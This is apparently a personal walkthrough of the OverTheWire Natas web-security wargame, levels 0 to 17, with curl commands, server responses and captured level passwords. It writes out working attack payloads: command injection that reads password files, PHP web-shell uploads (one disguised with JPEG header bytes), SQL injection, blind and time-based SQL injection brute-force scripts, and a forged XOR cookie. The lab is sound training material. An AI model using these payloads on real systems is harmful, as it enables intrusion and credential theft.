natas0:
	1. Visit http://natas0.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas0:natas0" (login found here: http://overthewire.org/wargames/natas/)
	4. We see "You can find the password for the next level on this page."
	5. $ curl http://natas0:natas0@natas0.natas.labs.overthewire.org/
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
		<body>
		<h1>natas0</h1>
		<div id="content">
		You can find the password for the next level on this page.
		<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
		</div>
		</body>
		</html>
natas1:
	1. Visit http://natas1.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto"
	4. Same deal, "You can find the password for the next level on this page, but rightclicking has been blocked!"
	5. $ curl http://natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto@natas1.natas.labs.overthewire.org/
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas1", "pass": "gtVrDuiDfck831PqWsLEZy5gyDz1clto" };</script></head>
		<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
		<h1>natas1</h1>
		<div id="content">
		You can find the password for the
		next level on this page, but rightclicking has been blocked!

		<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
		</div>
		</body>
		</html>
natas2:
	1. Visit http://natas2.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi"
	4. "There is nothing on this page" So, let's check source.
	   $ curl http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/
	   	<html>
	   	<head>
	   	<!-- This stuff in the header has nothing to do with the level -->
	   	<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
	   	<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
	   	<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
	   	<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
	   	<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
	   	<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
	   	<script>var wechallinfo = { "level": "natas2", "pass": "ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" };</script></head>
	   	<body>
	   	<h1>natas2</h1>
	   	<div id="content">
	   	There is nothing on this page
	   	<img src="files/pixel.png">
	   	</div>
	   	</body></html>
	5. Hmm, I wonder what's in "/files" directory? http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/
	6. We see "pixel.png" and "users.txt", let's see http://natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi@natas2.natas.labs.overthewire.org/files/users.txt
		# username:password
		alice:BYNdCesZqW
		bob:jw2ueICLvT
		charlie:G5vCxkVV3m
		natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
		eve:zo4mJWyNj2
		mallory:9urtcpzBmH
natas3:
	1. Visit http://natas3.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
	4. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org
	5. $ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/
		...
		<div id="content">
		There is nothing on this page
		<!-- No more information leaks!! Not even Google will find it this time... -->
		</div>
		...
	6. hmm, google you say?
	   $ curl http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/robots.txt
	   	User-agent: *
	   	Disallow: /s3cr3t/
	7. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/ we see "users.txt" again
	8. http://natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14@natas3.natas.labs.overthewire.org/s3cr3t/users.txt
		natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
natas4:
	1. Visit http://natas4.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"
	4. http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
		"Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" "
	5. Let's spoof our "Referer" header
	   $ curl -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ@natas4.natas.labs.overthewire.org
	   	...
	   	<div id="content">
	   	Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
	   	<br/>
	   	<div id="viewsource"><a href="index.php">Refresh page</a></div>
	   	</div>
	   	...
natas5:
	1. Visit http://natas5.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
	4. $ curl http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
		...
		<div id="content">
		Access disallowed. You are not logged in</div>
		...
	5. $ curl -v http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
		> GET / HTTP/1.1
		> Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx
		> User-Agent: curl/7.37.1
		> Host: natas5.natas.labs.overthewire.org
		> Accept: */*
		>
		< HTTP/1.1 200 OK
		< Date: Thu, 16 Jul 2015 16:18:33 GMT
		* Server Apache/2.4.7 (Ubuntu) is not blacklisted
		< Server: Apache/2.4.7 (Ubuntu)
		< X-Powered-By: PHP/5.5.9-1ubuntu4.11
		< Set-Cookie: loggedin=0
		< Vary: Accept-Encoding
		< Content-Length: 855
		< Content-Type: text/html
		<
		<html>
		<head>
		<!-- This stuff in the header has nothing to do with the level -->
		<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
		<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
		<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
		<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
		<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
		<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
		<body>
		<h1>natas5</h1>
		<div id="content">
		Access disallowed. You are not logged in</div>
		</body>
		</html>
	6. Set-Cookie: loggedin=0 .. let's override this!
	   $ curl -b "loggedin=1" http://natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq@natas5.natas.labs.overthewire.org
	   	...
	   	<div id="content">
	   	Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
	   	...
natas6:
	1. Visit http://natas6.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
	4. $ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org
		...
		<div id="content">
			<form method=post>
				Input secret: <input name=secret><br>
				<input type=submit name=submit>
			</form>
			<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		...
	5. not much to work with here, let's check that index-source.html
	  Visit: http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/index-source.html
	  	...
	  	<div id="content">
	  	<?
	  		include "includes/secret.inc";
	  	    if(array_key_exists("submit", $_POST)) {
	  	        if($secret == $_POST['secret']) {
		  	        print "Access granted. The password for natas7 is <censored>";
		  	    } else {
		  	        print "Wrong secret";
		  	    }
	  	    }
	  	?>
	  	<form method=post>
		  	Input secret: <input name=secret><br>
		  	<input type=submit name=submit>
	  	</form>
	  	<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
	  	...
	6. $ curl http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/includes/secret.inc
		<?
		$secret = "FOEIUWGHFEEUHOFUOIU";
		?>
	7. $ curl -d "secret=FOEIUWGHFEEUHOFUOIU&submit=" http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org/
		...
		Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
		...
natas7:
	1. Visit http://natas7.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"
	4. $ curl http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org
		...
		<div id="content">
		<a href="index.php?page=home">Home</a>
		<a href="index.php?page=about">About</a>
		<br>
		<br>
		<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
		</div>
		...
	5. $ curl "http://natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9@natas7.natas.labs.overthewire.org?page=/etc/natas_webpass/natas8"
		...
		DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
		...
natas8:
	1. Visit http://natas8.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe"
	4. $ curl http://natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe@natas8.natas.labs.overthewire.org/index-source.html
		...
		<div id="content">
		<?
		$encodedSecret = "3d3d516343746d4d6d6c315669563362";
		function encodeSecret($secret) {
		    return bin2hex(strrev(base64_encode($secret)));
		}
		if(array_key_exists("submit", $_POST)) {
		    if(encodeSecret($_POST['secret']) == $encodedSecret) {
		    print "Access granted. The password for natas9 is <censored>";
		    } else {
		    print "Wrong secret";
		    }
		}
		?>
		<form method=post>
		Input secret: <input name=secret><br>
		<input type=submit name=submit>
		</form>
		<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		...
	5.a. $ python -c "print '3d3d516343746d4d6d6c315669563362'.decode('hex')[::-1].decode('base64')"
		oubWYf2kBq
	5.b. $ php -r "echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));"
		oubWYf2kBq
	6. $ curl -d "secret=oubWYf2kBq&submit=" http://natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe@natas8.natas.labs.overthewire.org/
		...
		Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
		...
natas9:
	1. Visit http://natas9.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"
	4. $ curl http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/index-source.html
		...
		<form>
		Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
		</form>
		Output:
		<pre>
		<?
		$key = "";
		if(array_key_exists("needle", $_REQUEST)) {
		    $key = $_REQUEST["needle"];
		}
		if($key != "") {
		    passthru("grep -i $key dictionary.txt");
		}
		?>
		</pre>
		...
	5. That "passthru"  is vulnerable to command injection.
	   $ curl -d "needle= > /dev/null; echo 'hi';&submit=" http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/
	   	...
	   	Output:
	   	<pre>
	   	hi
	   	</pre>
	   	...
	6. It works! Let's read contents of the pass file.
	   $ curl -d "needle= > /dev/null; cat /etc/natas_webpass/natas10;&submit=" http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org/
	   	...
	   	nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
	   	...
natas10:
	1. Visit http://natas10.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
	4. $ curl http://natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu@natas10.natas.labs.overthewire.org/index-source.html
		...
		<pre>
		<?
		$key = "";

		if(array_key_exists("needle", $_REQUEST)) {
		    $key = $_REQUEST["needle"];
		}

		if($key != "") {
		    if(preg_match('/[;|&]/',$key)) {
		        print "Input contains an illegal character!";
		    } else {
		        passthru("grep -i $key dictionary.txt");
		    }
		}
		?>
		</pre>
		...
	5. They've blocked us from using ";" or "&" characters. That's fine.
		grep -i . /etc/natas_webpass/natas11 # dictionary.txt
	  $ curl -d "needle=. /etc/natas_webpass/natas11 #&submit=" http://natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu@natas10.natas.labs.overthewire.org/
	  	...
	  	<pre>
	  	U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
	  	</pre>
	  	...
natas11:
	1. Visit http://natas11.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
	4. $ curl -v http://natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK@natas11.natas.labs.overthewire.org/
		...
		< Set-Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D
		...
	5.
		...
		<?php
		$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
		echo json_encode($defaultdata);
		function xor_encrypt($in) {
		    $key = 'qw8J';
		    $text = '{"showpassword":"no","bgcolor":"#ffffff"}';
		    $outText = '';

		    // Iterate through each character
		    for($i=0;$i<strlen($text);$i++) {
		    	$outText .= $text[$i] ^ $key[$i % strlen($key)];
		    }
		    echo $outText;

		    return $outText;
		}
		function loadData($def) {
		    global $_COOKIE;
		    $mydata = $def;
		    if(array_key_exists("data", $_COOKIE)) {
		    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
		    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
		        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
		        $mydata['showpassword'] = $tempdata['showpassword'];
		        $mydata['bgcolor'] = $tempdata['bgcolor'];
		        }
		    }
		    }
		    return $mydata;
		}
		function saveData($d) {
		    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
		}
		$data = loadData($defaultdata);
		if(array_key_exists("bgcolor",$_REQUEST)) {
		    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
		        $data['bgcolor'] = $_REQUEST['bgcolor'];
		    }
		}
		saveData($data);
		?>
		<h1>natas11</h1>
		<div id="content">
		<body style="background: <?=$data['bgcolor']?>;">
		Cookies are protected with XOR encryption<br/><br/>
		<?php
		if($data["showpassword"] == "yes") {
		    print "The password for natas12 is <censored><br>";
		}
		?>
		<form>
		Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
		<input type=submit value="Set color">
		</form>
		<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		</div>
		...
	6. Using "xor" as an encryption is SUPER fail. We see the "data" cookie is "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=" which is base64_encode(xor_encrypt(json_encode($defaultdata))), where $defaultdata is array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
	   We can extract the key by modifying the xor_encrypt function like so:
		...
		<?php
			$key = '';
			$text = '{"showpassword":"no","bgcolor":"#ffffff"}';
			$outText = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=');

			// Iterate through each character
			for($i=0;$i<strlen($text);$i++) {
				$key .= $text[$i] ^ $outText[$i % strlen($outText)];
			}
			echo $key;
		?>
		...

		Running this we should see: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
		So, let's plugin "qw8J" and see if our output matches our original cookie.

		...
		<?php
			$key = 'qw8J';
			$text = '{"showpassword":"no","bgcolor":"#ffffff"}';
			$outText = '';

			// Iterate through each character
			for($i=0;$i<strlen($text);$i++) {
				$outText .= $text[$i] ^ $key[$i % strlen($key)];
			}
			echo base64_encode($outText);
		?>
		...

		You should see "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=" which matches our cookie!

	7. So, we can write our own data cookie now, let's set showpassword='yes'
		...
		php > $key = 'qw8J'; $text = '{"showpassword":"yes","bgcolor":"#ff0000"}'; $outText = ''; for($i=0;$i<strlen($text);$i++) {$outText .= $text[$i] ^ $key[$i % strlen($key)];} echo base64_encode($outText);
			ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK
		...
	8. curl -b "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sQUcIelMK" http://natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK@natas11.natas.labs.overthewire.org/
		...
		The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
		...
natas12:
	1. Visit http://natas12.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
	6. $ echo "<?php echo passthru('cat /etc/natas_webpass/natas13'); ?>" > foo.php
	7. $ curl -F submit="Upload File" -F filename="test.php" -F uploadedfile=@"foo.php" http://natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3@natas12.natas.labs.overthewire.org/index.php
		...
		The file <a href="upload/j3yb2nk300.php">upload/j3yb2nk300.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		...
	8. $ curl http://natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3@natas12.natas.labs.overthewire.org/upload/j3yb2nk300.php
		...
		jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
		...
natas13:
	1. Visit http://natas13.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"
	4. $ curl http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/
	5. Prompted that there's image header verification going on. Let's spoof a jpg ( https://en.wikipedia.org/wiki/List_of_file_signatures )
	5. $ printf "\xFF\xD8\xFF\xE0<?php echo passthru('cat /etc/natas_webpass/natas14'); ?>" > foo2.jpg
	6. $ curl -F submit="Upload File" -F filename="test.php" -F uploadedfile=@"foo2.jpg" http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/
		...
		The file <a href="upload/83m9pyj9wo.php">upload/83m9pyj9wo.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		...
	7. $ curl http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/upload/83m9pyj9wo.php
		...
		????Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
		...
	   $ curl -s http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/upload/83m9pyj9wo.php | xxd
		0000000: ffd8 ffe0 4c67 3936 4d31 3054 6466 6150  ....Lg96M10TdfaP
		0000010: 7956 426b 4a64 6a79 6d62 6c6c 5135 4c36  yVBkJdjymbllQ5L6
		0000020: 7164 6c31 0a                             qdl1.

		Question marks are just the special magic chars. Password is: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
natas14:
	1. Visit http://natas14.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"
	4. $ curl -d "username=\" or 1=1--&password=\" or 1=1--" http://natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1@natas14.natas.labs.overthewire.org/
		...
		Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
		...
natas15:
	1. Visit http://natas15.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
	4. We see a form with "username" paramter.
	4. $ curl -d 'username=natas16' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		This user exists.
		...
	5. $ curl -d 'username=natas16" and "a"="a' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		This user exists.
		...
	6. $ curl -d 'username=natas16" and "a"="A' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		This user exists.
		...
	7. $ curl -d 'username=natas16" and binary "a"="A' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		This user doesn't exist.
		...
	8. $ curl -d 'username=natas16" and binary SUBSTR(pass, 1, 1) = "a' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		Error in query
		...
	9. $ curl -d 'username=natas16" and binary SUBSTR(password, 1, 1) = "a' http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/
		...
		This user doesn't exist
		...
	10. Now we bruteforce!
		"""python
		import requests
		import sys

		password = ""

		while len(password) < 32:
			for char in list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'):
				print {'username':'natas16" and SUBSTR(password, %d, 1) = "%s' % (len(password)+1, char)}
				res = requests.post('http://natas15.natas.labs.overthewire.org/', data={'username':'natas16" and binary SUBSTR(password, %d, 1) = "%s' % (len(password)+1, char)}, auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
				if "user exists" in res.text:
					password += char
					print 'Current password:', password
					break

		print 'nastas16:%s' % password
		"""

		Output:
		...
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "a'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "b'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "c'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "d'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "e'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "f'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "g'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "h'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "i'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "j'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "k'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "l'}
		{'username': 'natas16" and SUBSTR(password, 31, 1) = "m'}
		Current password: WaIHEacj63wnNIBROHeqi3p9t0m5nhm
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "a'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "b'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "c'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "d'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "e'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "f'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "g'}
		{'username': 'natas16" and SUBSTR(password, 32, 1) = "h'}
		Current password: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
		nastas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
		...
	11. natas16 password is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
natas16:
	1. Visit http://natas16.natas.labs.overthewire.org
	2. We're prompted with an Authentication dialog.
	3. Login with "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
	4. Same as level 10, but they blocked us from using more characters this time. So, let's take a different approach.
	5. $ curl -d 'needle=$(cat /etc/natas_webpass/natas17 > /tmp/natas17password)hello' http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/
	6. Prepare our payload
		$ printf "\xFF\xD8\xFF\xE0<?php echo passthru('cat /tmp/natas17password'); ?>" > foo2.jpg
	7. $ curl -F submit="Upload File" -F filename="test.php" -F uploadedfile=@"foo2.jpg" http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/upload/wzo3e3425v.php
		...
		The file <a href="upload/83m9pyj9wo.php">upload/83m9pyj9wo.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
		...
	8. $ curl http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org/upload/83m9pyj9wo.php
		...
		????8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
		...
	9. natas17 password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
natas17:
	"""
	import requests
	import sys
	import time

	password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDj"

	while len(password) < 32:
		print 'Finding character in position: %d' % (len(password)+1)
		for char in list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'):
			start_time = time.time()
			res = requests.get('http://natas17.natas.labs.overthewire.org/index.php?username=natas18" and if(binary substr(password, %d, 1) = \'%s\', sleep(5), null) union select 1,"2' % (len(password)+1, char), auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
			if (time.time() - start_time) > 2:
				password += char
				print 'Current password:', password
				break

	print 'nastas18:%s' % password
	"""
	password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
natas18:
